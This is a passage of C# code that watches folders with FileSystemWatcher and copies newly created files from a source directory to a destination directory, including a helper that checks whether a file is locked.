            foreach (string sourceFiles in arrFiles)
            {

                string strFileName = Path.GetFileName(sourceFiles);
                string strDesFilePath = string.Format(@"{0}\{1}", strDestPath, strFileName);

                if (!File.Exists(strDesFilePath))
                    File.Copy(sourceFiles, strDesFilePath, true);
            }
        }

        public static bool IsFileLocked(string strSourcePath)
        {
            try
            {
                using (Stream stream = new FileStream(strSourcePath, FileMode.Open))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        private static void syncUpdatedFiles(string strSourceFile)
        {

            string strFileName = Path.GetFileName(strSourceFile);
            string strDesFilePath = string.Format(@"{0}\{1}", strDestPath, strFileName);
            var val = File.Exists(strDesFilePath);

            if (!File.Exists(strDesFilePath))
            {
                while (!IsFileLocked(strSourceFile))
                    ; ;

                File.Copy(strSourceFile, strDesFilePath, true);
            }

        }
        private static void OnChanged(object source, FileSystemEventArgs e)
        {
            Console.WriteLine("File: " + e.FullPath + " " + e.ChangeType);
            syncUpdatedFiles(e.FullPath);
        }
        private static void watch()
        {
            FileSystemWatcher watcher = new FileSystemWatcher();
            watcher.Path = strSourcePath;
            watcher.Filter = "*.*";
            watcher.Created += new FileSystemEventHandler(OnChanged);
            watcher.EnableRaisingEvents = true;
        }

        private static void OnCreated(object source, FileSystemEventArgs e)
        {
            Task.Factory.StartNew(() => Copyall()).Wait();
        }

        public static string WatchMe = @"C:\Users\PEGASUS";

        private static void ewatch()
        {
            FileSystemWatcher watcher = new FileSystemWatcher();
            watcher.Path = WatchMe;
            watcher.NotifyFilter = NotifyFilters.LastWrite;
            watcher.Filter = "*.*";
            watcher.Created += new FileSystemEventHandler(OnCreated);
            watcher.EnableRaisingEvents = true;
        }
    }
}
